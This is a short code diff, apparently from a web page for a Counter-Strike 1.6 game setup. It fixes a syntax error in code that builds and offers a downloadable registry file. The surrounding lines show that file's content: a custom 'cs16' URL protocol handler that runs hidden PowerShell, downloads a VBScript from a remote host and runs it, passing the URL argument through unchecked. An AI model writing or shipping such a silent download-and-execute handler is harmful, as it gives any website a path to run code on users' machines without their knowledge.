@@ -617,7 +617,7 @@ window.initEnvironment = function() {
 [HKEY_CURRENT_USER\\Software\\Classes\\cs16\\shell\\open\\command]
 @="powershell -WindowStyle Hidden -Command \\"$url='https://game-pkg.nobistudio.com/start.vbs'; $dest='D:\\\\Cs16\\\\start.vbs'; if(!(Test-Path 'D:\\\\Cs16')) { New-Item -ItemType Directory -Force -Path 'D:\\\\Cs16' }; Invoke-WebRequest -Uri $url -OutFile $dest -UseBasicParsing; wscript.exe $dest '%1'\\""`;
 
-  const blob = new Blob([regContent], { type: "text/plain;charset=utf-8" };
+  const blob = new Blob([regContent], { type: "text/plain;charset=utf-8" });
   const link = document.createElement("a");
   link.href = URL.createObjectURL(blob);
   link.download = "init_cs16.reg";
